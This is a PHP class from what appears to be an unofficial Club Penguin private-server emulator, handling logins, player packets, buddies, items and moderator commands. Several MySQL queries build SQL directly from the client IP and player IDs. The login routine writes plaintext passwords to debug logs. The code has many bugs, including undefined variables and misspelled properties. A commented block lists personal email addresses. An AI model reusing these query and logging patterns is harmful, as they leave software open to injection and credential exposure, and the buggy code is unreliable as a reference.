<?php
  
  // http://media1.clubpenguin.com/play/en/web_service/game_configs/mascots.jsonp
  // http://media1.clubpenguin.com/play/en/web_service/game_configs/rooms.jsonp
  
  namespace iCPro;
  
  abstract class iCPRawUser {
    const NOT_USED_BY_CLIENT = 0;
    
    public $clientID;
    public $isConnected;
    
    public $ip, $port;
    public $socket, $server;
    public $lastAction;
    public $rndKey, $lgnKey;
    public $modCode, $modAge;
    
    public $currentRoom, $currentTable, $joinRoomTime, $lastDig, $hasVoted;
    public $tables;
    
    public $playerId,     $playerName,    $playerPassword,  $playerAge;
    public $playerBan,    $playerLook,    $playerInventory, $playerFlags;
    public $playerX,      $playerY,       $playerFrame,     $playerString;
    public $playerMail,   $playerBuddies, $playerIgnores,   $playerDressing;
    public $playerStamps, $playerCoins,   $buddyRequests;
    
    public $isEPF, $isMascot, $mascotName, $mascotDressing;
    public $playerMedalsTotal, $playerMedalsUnused, $playerCurrentOP;
    
    public $iglooType, $iglooMusic, $iglooFloor, $iglooFurniture, $iglooInventory;
    public $isHidden, $isMuted, $isTryout, $isAdmin, $isBot, $isMod, $isTester, $isEPF_A, $isEPF_F, $isAgent = self::NOT_USED_BY_CLIENT, $isGuide = self::NOT_USED_BY_CLIENT;
    
    public $errorMessage, $maxBadge = 5;
    
    # for login
    
    public $confirmationHash, $friendsLoginKey;
    
    # # # # # # # #
    # Convenience #
    # # # # # # # #
    
    public function __get($func_name) {
      global $SERVER;
      if($func_name == 'room') return $this->currentRoom;
      if($func_name == 'swid') return $SERVER->generateSWID($this->playerName, $this->playerId);
      
      Akwaya::Notice('iCPRawUser::__get', "cannot resolve \${$func_name}!");
      
      return null;
    }
    
    public function __set($func_name, $func_value) {
      if($func_name == 'room') return $this->joinCommon($func_value);
      Akwaya::Notice('iCPRawUser::__set', "cannot resolve \${$func_name}!");
    }
    
    public $tempPuffleQuest;
    public function __construct($clientID, $socket, $serverSocket) {
      $this->tempPuffleQuest = json_decode('{"currTask":0,"questsDone":0,"tasks":[{"completed":false,"coin":0,"item":0},{"completed":false,"coin":0,"item":0},{"completed":false,"coin":0,"item":0},{"completed":false,"coin":0,"item":0}],"bonus":0,"cannon":false,"taskAvail":1398293937, "hoursRemaining":0, "minutesRemaining":0}');
      
      $this->clientID = $clientID;
      $this->isConnected = true;
      
      $this->socket = $socket;
      $this->server = $server;
      
      $this->lastAction = time();
      socket_getpeername($this->socket, $this->ip, $this->port);
    }
    
    public function checkIP() {
      global $SERVER;
      if(!\MySQL::GetData("SELECT * FROM `IPBans` WHERE '{$this->ip}' LIKE `IP` AND `Flag` = 1") && \MySQL::GetData("SELECT * FROM `IPBans` WHERE '{$this->ip}' LIKE `IP`")) {
        \Debugger::Debug(\DebugFlags::WARNING, sprintf('<inv>%s</inv> is <b>IP Banned</b> and will therefor be disconnected from the Server now...', $this));
        \iServer::RemoveClient($this->clientID);
        return true;
      } return false; /* Hmmm... Somehow I have the slighly feeling I should put a Weird-looking Smiley here... >X-3 */
    }
    
    public function __destruct() { if($this->isConnected) $this->kick('SERVER|GARBAGE_COLLECTOR', true); }
    public function __toString() { return "<b>{$this->playerName} [{$this->playerId}]</b> @ <b>Client #{$this->clientID}</b>:{$this->ip}"; }
    
    # # # # # # # # # #
    # Temporary stuff # TODO: Move to a different file.
    # # # # # # # # # #
    
    public function sendPuffleTaskCookie() { // TODO: A cache sub-system.
      $this->sendPacket("%xt%rpqd%{$this->currentRoom}%" . json_encode($this->tempPuffleQuest) . "%");
    }
    
    public function sendPuffleTaskCompleted($func_taskId) {
      if($func_taskId < 0 || $func_taskId > 3) return; // TODO: Error report.
      if($func_taskId != $this->tempPuffleQuest->currTask) return; // TODO: Error report.
      
      $this->tempPuffleQuest->tasks[$func_taskId]->completed = true;
      ++$this->tempPuffleQuest->currTask;
      
      // TODO: Time limit?
      $this->sendPuffleTaskCookie();
    }
    
    public function sendPuffleCoinCollected($func_taskId) {
      if($func_taskId < 0 || $func_taskId > 3) return; // TODO: Error report.
      if(!$this->tempPuffleQuest->tasks[$func_taskId]->completed) return; // TODO: Error report.
      
      $func_coin = ++$this->tempPuffleTask->tasks[$func_taskId]->coin;
      addCoins(150);
      
      $this->sendPacket("%xt%rpqcc%{$this->currentRoom}%{$func_taskId}%{$func_coin}%{$this->playerCoins}%");
    }
    
    public function sendPuffleItemCollected($func_taskId) {
      if($func_taskId < 0 || $func_taskId > 3) return; // TODO: Error report.
      if(!$this->tempPuffleQuest->tasks[$func_taskId]->completed) return; // TODO: Error report.
      $this->tempPuffleTask->tasks[$func_taskId]->item = 1;
      
      // TODO: Add item!
      
      $this->sendPacket("%xt%rpqic%{$this->currentRoom}%{$func_taskId}%");
    }
    
    public function sendPuffleBonusCollected() {
      if($this->tempPuffleQuest->currTask < 4) return; // TODO: Error report.
      $this->tempPuffleTask->bonus = 1;
      $this->sendPacket("%xt%rpqbc%{$this->currentRoom}%");
    }
    
    # # # # # # # # # # # # # # # # #
    # Core Packet Sending Functions #
    # # # # # # # # # # # # # # # # #
    
    public function sendPacket($packet, $append = true) {
      global $SERVER;
      
      if($this->isConnected) \Debugger::Debug(\DebugFlags::FINE, sprintf('<inv>%s</inv> will receive <b>%s</b>...', $this, htmlentities($packet)));
      return @socket_write($this->socket, $append ? $packet . \iServer::$escapeChar : $packet, strlen($packet) + ((integer) $append)) ||
       ($this->isConnected && $SERVER->handleDisconnect(false, $this->clientID));
    }
    
    public function sendRoomPacket($packet, $append = true) {
      if($this->isHidden) return $this->currentRoom->sendModPacket($packet, $append);
      return $this->currentRoom->sendPacket($packet, $append);
    }
    
    /*
    public function sendModPacket($packet, $append = true) {
      global $SERVER;
      
      $packet = str_replace($this->playerString, str_replace($this->playerName, "{$this->playerName} // Hidden", $this->playerString), $packet);
      foreach($SERVER->data['Rooms'][$this->currentRoom] ?: array() as $user) if($user->isMod) $user->sendPacket($packet, $append);
      
      return true;
    }*/
    
    # # # # # # # # # # # # # # #
    # Packet Sending Functions  #
    # # # # # # # # # # # # # # #
    
    public function sendError() {
      return $this->sendPacket('%xt%e%-1%' . join('%', func_get_args()) . '%');
    }
    
    public function sendPolicyFile() {
      return $this->sendPacket('<cross-domain-policy><allow-access-from domain="*" to-ports="' . SERVER_PORT . '" /></cross-domain-policy>');
    }
    
    public function sendVersionCheck($version) {
      return $version == 153 ?
              $this->sendPacket('<msg t="sys"><body action="apiOK" r="0"></body></msg>'):
              $this->sendPacket('<msg t="sys"><body action="apiKO" r="0"></body></msg>');
    }
    
    public function sendRandomKey() {
      if(!$this->rndKey) $this->rndKey = Utils::GenerateRandomKey('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[](){}/\\\'"', 16);
      return $this->sendPacket('<msg t="sys"><body action="rndK" r="-1"><k>' . $this->rndKey . '</k></body></msg>');
    }
    
    public function sendRemainingBanTime() {
      if(($banHours = ceil(($this->playerBan - time()) / 3600)) === 1) return $this->sendError(CPErrors::BANNED_AN_HOUR);
      /* This space for rent. Contact Alex for further Informations */ else return $this->sendError(CPErrors::BANNED_DURATION, $banHours);
    }
    
    # # # # # # # # #
    # Misc Packets  #
    # # # # # # # # #
    
    public function updateMood($mood) {
      global $SERVER;
      $m = SettingsManager::GetSetting(Settings::MAX_MOOD_LENGTH);
      
      list($mood) = explode('|', $mood);
      if(strlen($mood) > $m) $mood = substr($mood, 0, $m - 3) . '...';
      
      //... It's impossible that a false-equaling Mood can be sent (except using WPEPro >.<) ...//
      $this->updateProperty('playerMood', $mood ?: 'I am a Wannabe-Hacker');
      
      $this->sendRoomPacket("%xt%umo%{$this->playerId}%{$this->playerMood}%");
      return $this->refreshPlayerString();
    }
    
    public function sendComment($uID, $comment) {
      if($uID < 1) return $this->sendErrorBox('max', 'Could not save your Comment :s', 'Crap', 'iComment'); global $SERVER;
      if(!$SERVER->data['Users'][$uID]) return $this->sendErrorBox('max', 'Cmon, that User doesn\'t even exists!', 'Yea, I\'m dumb', 'iComment');
      $this->sendErrorBox('max', 'Your Comment has been saved!', 'Yay!', 'iComment');
      
      UserLog::AddToLog($uID, LogEvents::NEW_COMMENT);
      
      $type = '<!-- CMT0 -->';
      if($this->isMod) $type = '<!-- CMT1 -->';
      if($this->isAdmin) $type = '<!-- CMT2 -->';
      
      $comment = urlencode('<b>' . htmlentities($this->playerName) . ':</b> "' . htmlentities($comment) .
                                '"<br /><i>on ' . date('d.m.Y&\n\b\s\p;H:i:s') . '</i><br />');
      
      $name = ROOT . "/Website/team.iCPNetwork.org/Comments/Users/{$uID}.txt";
      $data = @file_get_contents($name);
      
      if(!$data) $data = "<b>Admin Comments:</b><!-- CMT2 -->\n\n<b>Moderator Comments:</b><!-- CMT1 -->\n\n<b>Human Comments:</b><!-- CMT0 -->\n\n";
      return file_put_contents($name, str_replace($type, $type . chr(10) . $comment, $data));
    }
    
    public function setGlow($main) {
      $allow = array_flip(str_split(' 0123456789. '));
      $main = str_split($main);
      foreach($main as &$char) $char = $allow[$char] ? $char : '';
      
      return $this->glow = join('', $main);
    }
    
    # # # # # # # # # #
    # Login Functions #
    # # # # # # # # # #
    
    public function loadPlugin($pluginID, $pluginURL) {
      return $this->sendPacket('%xt%pl%-1%' . $pluginID . '%' . $pluginURL . '%');
    }
    
    public function login($uName, $pWord) {
      global $SERVER;
      
      $split = explode('|', $uName);
      if(count($split) > 1) { // (uses confirmation hash): 'unknown|swid|username|loginKey|... unknown ...'
        \Debugger::Debug(\DebugFlags::FINE, sprintf('<inv>%s</inv> uses the confirmation-hash protocol.', $this));
        list(, $swid, $uName, $loginKey) = $split;
        list($pWord, $confHash) = explode('#', $pWord);
      }
      
      \Debugger::Debug(\DebugFlags::FINE, sprintf('<inv>%s</inv> tries to log in as <b>%s</b> (%s)...', $this, $uName, $pWord));
      
      $user = $SERVER->getUser(strtolower($uName));                                                       # # # # # # # # # # #
      if($user == NULL || !$this->appendBy($user))  return $this->sendError(CPErrors::NAME_NOT_FOUND);   # User does not exist #
      if($SERVER->getPasswordHash($this) != $pWord) return $this->sendError(CPErrors::PASSWORD_WRONG);   # Password is wrong   #
                                                                                                         # # # # # # # # # # # #
      if($this->playerBan === 1)        return $this->sendError(CPErrors::BANNED_FOREVER);               # Banned forever      #
      elseif($this->playerBan > time()) return $this->sendRemainingBanTime();                            # Banned for %d hours #
                                                                                                          # # # # # # # # # # #
      return (SERVER_TYPE == ServerTypes::LOGIN || ($this->convertFlags() ^ $this->refineData())) ^ $SERVER->acceptLogin($this) ^ $this->loadIgloo();
    }
    
    protected function convertFlags() {
      $this->playerInventory .= $this->playerRedemptions;
      
      $this->isAdmin  = (integer)(bool)($this->playerFlags &  1);
      $this->isMod    = (integer)(bool)($this->playerFlags &  2) ?: (integer)(SERVER_TYPE == ServerTypes::STEALTH);
      $this->isTester = (integer)(bool)($this->playerFlags &  4);
      $this->isEPF    = (integer)(bool)($this->playerFlags &  8);
      $this->isTryout = (integer)(bool)($this->playerFlags & 16);
      
      return true;
    }
    
    protected function refineData() {
      $this->playerAge = floor((time() - $this->playerAge) / 86400);
      $this->refreshPlayerString();
    }
    
    protected function appendBy($object) {
      if(!is_array($object)) return false;
      foreach($object as $key => $value) $this->$key = $value;
      return true;
    }
    
    public function joinServer() {
      $this->sendPacket("%xt%js%-1%{$func_u->isAgent}%{$func_u->isGuide}%0%"); // {$func_u->isMod}%");
      JOIN_RANDOM_ROOM ;{
        $func_favRooms = array(
          100 => 40,
          220 => 30,
          111 => 20,
          110 => 10
        );
        
        $func_nicestRoomID = 100;
        $func_nicestPoints = 0;
        foreach($func_favRooms as $func_favRoomID => $func_favRoomDiv) {
          $func_uCount = count($SERVER->data['Rooms'][$func_favRoomID]);
          if($func_uCount > SettingsManager::GetSetting(Settings::ROOM_LIMIT)) continue;
          
          $func_points = $func_favRoomDiv / ($func_uCount ? $func_uCount : 1);
          if($func_points > $func_nicestPoints) $func_nicestRoomsID = $func_favRoomID;
        }
        
        $this->joinRoom($func_nicestRoomID);
      };
    }
    
    public function getRevision() {
      //$this->sendPacket('%xt%glr%-1%' . filemtime(__FILE__) . '%');
      
      $this->sendGetPlayerStamps((integer)$this->playerId);
      $this->sendPacket("%xt%pgu%-1%" . self::getPuffles((integer)$this->playerId)); // Needed so puffles in igloos work.
      $this->sendPacket("%xt%lp%-1%{$this->playerString}%{$this->playerCoins}%0%1440%" . time() . "%{$this->playerAge}%0%" . ($this->isTryout ? 10 : 2147483647) . "%365%8%");
      
      //$this->sendPacket("%xt%am%http://alexrath.gotdns.org/mcOLD/roomFurni.swf%");
      
      /*
      if($this->isMod) $this->sendPacket("%xt%mm%-1%1001%Welcome as a Moderator!%");
      $this->sendPacket("%xt%sm%100%1001%Welcome on our Server!%");
      $this->sendPacket("%xt%sm%100%1001%If you are worker at Club Penguin and%");
      $this->sendPacket("%xt%sm%100%1001%want us to shut down this Server, contact us at%");
      $this->sendPacket("%xt%sm%100%1001%paulccote@gmail.com or halloanjedendenichkenne@gmail.com%");
      $this->sendPacket("%xt%sm%100%1001%Or in Skype as wannaspeakenglish1%");
      */
    }
    
    # # # # # # # # # #
    # Item Functions  #
    # # # # # # # # # #
    
    public function addCoins($amount, $byGame = false) {
      $this->updateProperty('playerCoins', $this->playerCoins + $amount);
      if($byGame !== false) $this->sendPacket("%xt%zo%{$byGame}%{$this->playerCoins}%Walruses%are%dumb%");
    }
    
    public function addItem($itemID) {
      if(strpos("%{$this->playerInventory}%", "%{$itemID}%") !== false) return $this->sendError(CPErrors::ITEM_IN_HOUSE);
      global $SERVER;
      
      $cost = $SERVER->getCrumbProperty('Items', $itemID, 'Cost');
      if($cost === false)            return $this->sendError(CPErrors::ITEM_NOT_EXIST);
      if($cost > $this->playerCoins) return $this->sendError(CPErrors::NOT_ENOUGH_COINS);
      
      $this->playerInventory .= "{$itemID}%";
      $this->sendPacket("%xt%ai%{$this->currentRoom}%{$itemID}%{$this->playerCoins}%");
      
      if($this->isTryout) return true;
      return
       $SERVER->updateUserProperty($this->playerId, 'playerCoins',     $this->playerCoins) &&
       $SERVER->updateUserProperty($this->playerId, 'playerInventory', $this->playerInventory);
    }
    
    public function updateLayer($layer, $itemID) {
      global $SERVER;
      
      if($itemID !== 0 && strpos("%{$this->playerInventory}%", "%{$itemID}%") === false) return false;
      $this->sendRoomPacket("%xt%{$layer}%{$this->currentRoom}%{$this->playerId}%{$itemID}%");
      
      $this->isMascot ? $dressing = &$this->mascotDressing : $dressing = &$this->playerDressing;
      
      list($upc, $uph, $upf, $upn, $upb, $upa, $upe, $upl, $upp) = explode('|', $dressing);
      $layer  = "{$layer}";
      $$layer = $itemID;
      
      $dressing = "{$upc}|{$uph}|{$upf}|{$upn}|{$upb}|{$upa}|{$upe}|{$upl}|{$upp}";
      $this->refreshPlayerString();
      return $this->isTryout or $SERVER->updateUserProperty($this->playerId, 'playerDressing', $this->playerDressing);
    }
    
    public function getLayer($layer) {
      $itemID = "{$layer}";
      list($gpc, $gph, $gpf, $gpn, $gpb, $gpa, $gpe, $gpl, $gpp) = explode('|', $this->playerDressing);
      
      $names = array(
        'gpc' => 'ColorID',
        'gph' => 'Head Item',
        'gpf' => 'Face Item',
        'gpn' => 'Neck Item',
        'gpb' => 'Body Item',
        'gpa' => 'Hand Item',
        'gpe' => 'Feet Item',
        'gpl' => 'FlagID',
        'gpp' => 'BackgroundID'
      );
      return $this->sendErrorBox('max', sprintf('Your %s is %d.', $names[$layer], $$itemID), 'Thanks :)', 'iWear');
    }
    
    public function refreshPlayerString() {
      global $SERVER;
      return $this->playerString = $SERVER->getPlayer($this->playerId, array(
        'x' => $this->playerX,
        'y' => $this->playerY,
        'frame' => $this->playerFrame,
        'isMascot' => $this->isMascot,
        'mascotName' => $this->mascotName,
        'mascotDressing' => $this->mascotDressing
      ));
    }
    
    # # # # # # # # # #
    # Room Functions  #
    # # # # # # # # # #
    
    public function joinIgloo($func_playerId, $func_area) { $this->joinCommon(Rooms\Igloo::Load($func_playerId, $func_area)); }
    public function joinGame($func_gameId)                { $this->joinCommon(Rooms\GameRoom::Load($func_gameId));            }
    public function joinRoom($func_roomId)                { $this->joinCommon(Rooms\GenericRoom::Load($func_roomId));         }
    
    private function joinCommon($func_room) {
      if(!$func_room) return $this->sendError(CPErrors::ROOM_FULL); // Yeah, the room wasn't found.
      if($func_room->isFull()) return $this->sendError(CPErrors::ROOM_FULL);
      
      Games\GameManager::RemoveFromGames($this);
      
      $this->playerFrame = 1;
      $this->playerX     = 0;
      $this->playerY     = 0;
      $this->refreshPlayerString();
      
      $func_room->addPlayer($this);
      
      $this->joinRoomTime = time();
    }
    
    # # # # # # # # # # # # # # #
    # Player Handler Functions  #
    # # # # # # # # # # # # # # #
    
    public function getPlayerName() { return $this->isMascot ? $this->mascotName : $this->playerName; }
    public function sendPlayerMove($x, $y) {
      $this->playerX = $x;
      $this->playerY = $y;
      
      $this->refreshPlayerString();
      $this->sendRoomPacket("%xt%sp%{$this->currentRoom}%{$this->playerId}%{$this->playerX}%{$this->playerY}%");
      
      return true;
    }
    
    public function sendFrame($frame) {
      $this->playerFrame = $frame;
      $this->refreshPlayerString();
      
      return $this->sendRoomPacket("%xt%sf%{$this->currentRoom}%{$this->playerId}%{$this->playerFrame}%");
    }
    
    public function sendAction($action) {
      $this->playerFrame = 1;
      $this->refreshPlayerString();
      
      return $this->sendRoomPacket("%xt%sa%{$this->currentRoom}%{$this->playerId}%{$action}%");
    }
    
    # # # # # # # # # #
    # Buddy Functions #
    # # # # # # # # # #
    
    public function getPlayerBuddies() {
      if($this->playerBuddies) return $this->playerBuddies;
      global $SERVER;
      
      $this->playerBuddies = '';
      foreach(\MySQL::GetData("SELECT * FROM `Friendships` WHERE `playerA` = {$this->playerId} OR `playerB` = {$this->playerId}") as $line) {
        $pID   = $line[$line['playerA'] == $this->playerId ? 'playerB' : 'playerA'];
        $pName = $SERVER->data['Users'][$pID]['playerName'];
        $pStat = (integer)isset($SERVER->alias[$pID]);
        
        $this->playerBuddies .= "{$pID}|{$pName}|{$pStat}%"; 
      }
      
      return $this->playerBuddies;
    }
    
    public function requestBuddy($playerId) {
      global $SERVER;
      
      if(!isset($SERVER->alias[$playerId])) return $this->sendError(CPErrors::NAME_NOT_FOUND);
      $SERVER->alias[$playerId]->sendPacket("%xt%br%{$this->currentRoom}%{$this->playerId}%{$this->playerName}%");
      $SERVER->alias[$playerId]->buddyRequests[$this->playerId] = true;
      
      return true;
    }
    
    public function acceptBuddy($playerId) {
      global $SERVER;
      
      if(!isset($this->buddyRequests[$playerId]))   return $this->kick('SERVER', true);
      if(!isset($SERVER->data['Users'][$playerId])) return $this->kick('SERVER', true);
      $user = $SERVER->data['Users'][$playerId];
      
      unset($this->buddyRequests[$playerId]);
      
      $this->playerId < $playerId ? ($sID = $this->playerId) && ($hID = $playerId) : ($sID = $playerId) && ($hID = $this->playerId);
      \MySQL::Insert('Friendships', array(
        'playerA' => $sID,
        'playerB' => $hID
      ));
      
      $this->sendPacket("%xt%ba%{$this->currentRoom}%{$user->playerId}%{$user->playerName}%");
      return isset($SERVER->alias[$playerId]) ?
      $SERVER->alias[$playerId]->sendPacket("%xt%ba%{$this->currentRoom}%{$this->playerId}%{$this->playerName}%") : false;
    }
    
    public function removeBuddy($playerId) {
      global $SERVER;
      
      $this->playerId < $playerId ? ($sID = $this->playerId) && ($hID = $playerId) : ($sID = $playerId) && ($hID = $this->playerId);
      \MySQL::Query("DELETE FROM `Friendships` WHERE `playerA` = {$sID} AND `playerB` = {$hID} LIMIT 1");
      
      return isset($SERVER->alias[$playerId]) ?
      $SERVER->alias[$playerId]->sendPacket("%xt%rb%{$this->currentRoom}%{$this->playerId}%{$this->playerName}%") : false;
    }
    
    public function findBuddy($playerId) { //... [IDEA] Perhaps add a IsItMyBuddyCheck here? ...//
      return isset($SERVER->alias[$playerId]) ?
       $this->sendPacket('%xt%bf%-1%' . (($room = $SERVER->alias[$playerId]->currentRoom) > 1000 ? $room + 1000 : $room) . '%') :
       $this->sendError(CPErrors::NAME_NOT_FOUND);
    }
    
    public function noticeBuddies($status) {
      global $SERVER;
      
      $buddyIDs = explode('%', $this->getPlayerBuddies());
      $packet   = "%xt%{$status}%-1%{$this->playerId}%";
      foreach($buddyIDs as $buddyID) ($u = $SERVER->alias[strstr($buddyID, '|', true)]) ? $u->sendPacket($packet) : false;
      return true;
    }
    
    # # # # # # # # # # #
    # Ignore Functions  #
    # # # # # # # # # # #
    
    public function getPlayerIgnores() {
      if($this->playerIgnores) return $this->playerIgnores;
      global $SERVER;
      
      $res = \MySQL::Query('SELECT * FROM `Ignores` WHERE `ignoringPlayer` = ' . $this->playerId);
      $this->playerIgnores = '';
      while($line = \MySQL::FetchArray($res, \MySQL::ASSOC)) {
        $pID   = $line['ignoredPlayer'];
        $pName = $SERVER->data['Users'][$pID]['playerName'];
        
        $this->playerIgnores .= "{$pID}|{$pName}%"; 
      }
      
      \MySQL::FreeResult($res);
      return $this->playerIgnores;
    }
    
    public function addIgnore($playerId) {
      global $SERVER;
      
      if(!isset($this->buddyRequests[$playerId]))   return $this->kick('SERVER', true);
      if(!isset($SERVER->data['Users'][$playerId])) return $this->kick('SERVER', true);
      $user = $SERVER->data['Users'][$playerId];
      
      \MySQL::Insert('Ignores', array(
        'ignoringPlayer' => $this->playerId,
        'ignoredPlayer'  => $playerId
      ));
      
      $this->sendPacket("%xt%an%{$this->currentRoom}%{$user->playerId}%{$user->playerName}%");
      return isset($SERVER->alias[$playerId]) ?
      $SERVER->alias[$playerId]->sendPacket("%xt%an%{$this->currentRoom}%{$this->playerId}%{$this->playerName}%") : false;
    }
    
    public function removeIgnore($playerId) {
      global $SERVER;
      
      \MySQL::Query("DELETE FROM `Ignores` WHERE `ignoringPlayer` = {$this->playerId} AND `ignoredPlayer` = {$playerId} LIMIT 1");
      return isset($SERVER->alias[$playerId]) ?
      $SERVER->alias[$playerId]->sendPacket("%xt%rn%{$this->currentRoom}%{$this->playerId}%{$this->playerName}%") : false;
    }
    
    # # # # # # # # # # # # # # # #
    # Message/Moderator Functions #
    # # # # # # # # # # # # # # # #
    
    public function reportPlayer($playerId, $reasonID, $nickname) {
      global $SERVER;
      
      $report = "Reported: ID:{$playerId} (Nick:{$nickname}, Reason:{$reasonID})" .
                     "by ID:{$this->playerId} (Nick:{$this->playerName}, Room:{$this->playerRoom})";
      
      $modIDs = array();
      foreach($SERVER->users as $modID => $u) if($u->isMod) $modIDs[] = $modID;
      $a = Utils::PickRandom($modIDs);
      $b = Utils::PickRandom(array_diff($modIDs, array($a)));
      $c = Utils::PickRandom(array_diff($modIDs, array($a, $b)));
      
      $count = 0;
      if($SERVER->users[$a] && ++$count) $SERVER->users[$a]->sendErrorBox('max', $report, 'Okay', 'iMod Report');
      if($SERVER->users[$b] && ++$count) $SERVER->users[$b]->sendErrorBox('max', $report, 'Okay', 'iComod Report');
      if($SERVER->users[$c] && ++$count) $SERVER->users[$c]->sendErrorBox('max', $report, 'Okay', 'iLamod Report');
      $this->sendErrorBox('max', "Thanks for your Report, {$count} Moderator" . ($count == 1 ? '' : 's') . " have been noticed!", 'Thanks :)', 'iReport');
      
      return false;
    }
    
    public function sendErrorBox($size, $message, $buttonLabel, $errorCode) {
      $data = func_get_args();
      $data[1] = str_replace(array('$playerName', '$playerId', '$$'), array($this->playerName, $this->playerId, '$'), $message);
      return $this->sendPacket('%xt%gs%-1%' . join('%', $data) . '%');
    }
    
    public function sendFlashCommand() {
      return $this->sendPacket('%xt%fc%-1%' . join('%', func_get_args()) . '%');
    }
    
    public function sendPrivateMessage($playerName, $playerId, $message) {
      return $this->sendPacket('%xt%pmsg%-1%' . join('%', func_get_args()) . '%');
    }
    
    public function retrieveSession() {
      return ($this->modAge + SettingsManager::GetSetting(Settings::MODERATOR_TTL)) < time() ? false : $this->modCode;
    }
    
    public function joinPlayer($player) {
      $player = $this->getPlayers($player);
      $player = array_shift($player);
      if(!$player) return $this->sendErrorBox('max', 'No matching Player found.', 'Damnit', 'iMove');
      
      $this->joinRoom($player->currentRoom);
      return $this->sendErrorBox('max', sprintf(
        'You have joined the same Room as %s.',
        $player->playerName),
      'Thanks :)', 'iMove');
    }
    
    public function movePlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > SettingsManager::GetSetting(Settings::MOVE_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t move that many Users at once!', 'Damn', 'iMove');
      
      foreach($players as $player) $player->joinRoom($this->currentRoom);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been moved to your Room.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iMove');
    }
    
    public function getPlayerString($players) {
      $players = array_values($players);
      $retVal = '';
      $count = count($players);
      
      if($count == 1) return $players[0]->playerName;
      foreach($players as $i => $player) {
        if($i == 0) $retVal .= $player->playerName;
        elseif($i == $count - 1) $retVal .= ' and ' . $player->playerName;
        else $retVal .= ', ' . $player->playerName;
      }
      
      return $retVal ?: '|Nobody|';
    }
    
    public function getPlayers($players) {
      global $SERVER;
      
      var_dump('Getting Players', $player);
      
      $objects = array();
      $players = explode('|', trim($players));
      foreach($players as &$player) {
        $player = strtolower($player);
        if(!is_numeric($player)) {
          foreach($SERVER->alias as $playerId => $u)
           if(strtolower($u->playerName) == $player || $u->isMascot && strtolower($u->mascotName) == $player)
            $objects[$playerId] = $u;
          continue;
        }
        
        $player = (integer) $player;
        if($this->isAdmin && $player == -2) foreach($SERVER->alias as $player => $u) $objects[$player] = $u;
        elseif($player == -1) foreach($SERVER->alias as $player => $u)
         if($u->currentRoom == $this->currentRoom) $objects[$player] = $u;
         else;
        elseif($SERVER->alias[$player]) $objects[$player] = $SERVER->alias[$player];
        elseif($roomID = -$player) foreach($SERVER->alias as $player => $u)
         if($u->currentRoom == $roomID) $objects[$player] = $u;
      }
      
      return $objects;
    }
    
    public function getUserWhois($player) {
      $players = $this->getPlayers($player);
      return $this->sendErrorBox('max', join(', ', $players), 'Thanks :)', 'iWhois');
    }
    
    public function kickPlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > SettingsManager::GetSetting(Settings::KICK_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t kick that many Users at once!', 'Damn', 'iKick');
      
      foreach($players as $player) $player->kick($this->playerName, $this->isAdmin);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been kicked.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iKick');
    }
    
    public function mutePlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > SettingsManager::GetSetting(Settings::MUTE_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t mute that many Users at once!', 'Damn', 'iMute');
      
      foreach($players as $player) $player->mute($this->playerName, $this->isAdmin);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been muted.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iMute');
    }
    
    public function showError($error) {
      $this->errorMessage = $error;
      $this->sendErrorBox('max', $this->errorMessage, 'Okay', $this->playerName);
    }
    
    public function showErrorToUsers($player) {
      $players = $this->getPlayers($player);
      foreach($players as $player) $player->sendErrorBox('max', $this->errorMessage, 'Okay', $this->playerName);
      var_dump($this);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been shown the Error "%s".',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've',
        $this->errorMessage),
      'Thanks :)', 'iError');
    }
    
    public function serverRestart($reason) {
      global $SERVER;
      
      $this->errorMessage = $reason;
      $this->showErrorToUsers('-2');
      $this->sendErrorBox('max', $this->errorMessage, 'Okay', $this->playerName);
      
      sleep(5);
      
      $this->kick($this->playerName, true);
      $this->kickPlayer('-2');
      $SERVER->isRunning = false;
      
      return;
    }
    
    public function copyPlayer($player) {
      global $SERVER;
      
      list($player, $add) = explode('|', $player);
      $player = strtolower($player); $user;
      foreach($SERVER->data['Users'] as $user) if($user['playerId'] == $player || strtolower($user['playerName']) == $player) break;
      if(!$user) return $this->sendErrorBox('max', 'Could not find the User ' . func_get_arg(0), 'Mmmk', 'iCopy');
      
      if($user['playerFlags'] & 1 && $this->isAdmin == false) return $this->sendErrorBox('max', 'You cannot copy Admins!', 'Mmmk', 'iCopy');
      
      $this->isMascot = true;
      $this->mascotName = $add ? $this->playerName : $user['playerName'];
      $this->mascotDressing = $user['playerDressing'];
      $this->resendDressing((boolean) $add);
      
      return $add ?: $this->joinRoom($this->currentRoom);
    }
    
    public function changeName($name) {
      list($name, $add) = explode('|', $name);
      
      $this->isMascot = true;
      $this->mascotName = $name;
      if(!$this->isMascot) $this->mascotDressing = $this->playerDressing;
      $this->resendDressing((boolean) $add);
      
      return $add ?: $this->joinRoom($this->currentRoom);
    }
    
    public function killMascot($player) {
      $players = $this->getPlayers($player);
      foreach($players as $player) if($player->isMascot && $this->isAdmin) $player->replicateMascot('Normal');
    }
    
    public function getInfo() {
      global $SERVER;
      return $this->sendErrorBox('max', sprintf(
        'This iCP has %d registred Users, from which %d are online.%s In your current Room (ID: %d) there are %d People.',
        round(count($SERVER->data['Users']) / 2),
        count($SERVER->alias),
        chr(10),
        $this->currentRoom,
        count($SERVER->data['Rooms'][$this->currentRoom])
      ), 'Thanks :)', 'iNfo');
    }
    
    public function transmitPrivateMessage($main) {
      list($player, $message) = explode('||', $main);
      
      $players = $this->getPlayers($player);
      foreach($players as $player) {
        UserLog::AddToLog($player->playerId, LogEvents::NEW_PRIVMSG, array(time(), $this->playerName, $this->playerId, $message));
        $player->sendPrivateMessage($this->playerName, $this->playerId, $message);
      }
      
      return true;
    }
    
    protected function initializeWorldJoin() {
